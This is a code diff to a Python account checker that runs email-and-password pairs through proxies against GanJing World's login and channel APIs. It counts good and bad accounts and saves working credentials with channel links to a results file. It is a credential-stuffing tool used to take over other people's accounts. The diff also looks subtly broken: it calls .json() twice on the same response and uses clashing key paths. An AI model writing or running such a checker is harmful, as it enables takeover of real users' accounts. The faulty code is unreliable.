@@ -540,8 +540,6 @@ def check_acc(account, total):
                 bad += 1
                 print(f"\033[91m[Good: {good} Bad: {bad} | Total: {total}]{email}|{password}|Wrong password")
                 return
-            good += 1
-            print(f"\033[92m[Good: {good} Bad: {bad} | Total: {total}]{email}|{password}|Login success")
             while True:
                 try:
                     h = {
@@ -554,12 +552,18 @@ def check_acc(account, total):
                         "https":f"http://{pr}"
                     }
                     data_channel = requests.post("https://gw.ganjingworld.com/v1.0c/get-my-channels", headers=h, proxies=p).json()
-                    open("log.txt", "a", encoding="utf-8").write(f"{email}|{password}|{str(data_channel)}\n")
+                    if data_channel.json()["result"]["data"]["my_channel_is_deleted"] == True:
+                        open("Result_check_acc.txt", "a", encoding="utf-8").write(f"{email}|{password}|Channel is deleted\n")
+                        bad += 1
+                        print(f"\033[91m[Good: {good} Bad: {bad} | Total: {total}]{email}|{password}|Channel is deleted")
+                        return
                     data_channel = data_channel["data"]["channels"][0]
                     break
                 except Exception as e:
                     open("Error_Log.txt", "a", encoding="utf-8").write(f"{email}|{password}|{str(e)}\n")
                     continue
+            good += 1
+            print(f"\033[92m[Good: {good} Bad: {bad} | Total: {total}]{email}|{password}|Login success")
             uid = data_channel["id"]
             name = data_channel["name"]
             open("Result_check_acc.txt", "a", encoding="utf-8").write(f"{email}|{password}|Login success|https://www.ganjingworld.com/channel/{uid}|{name}\n")
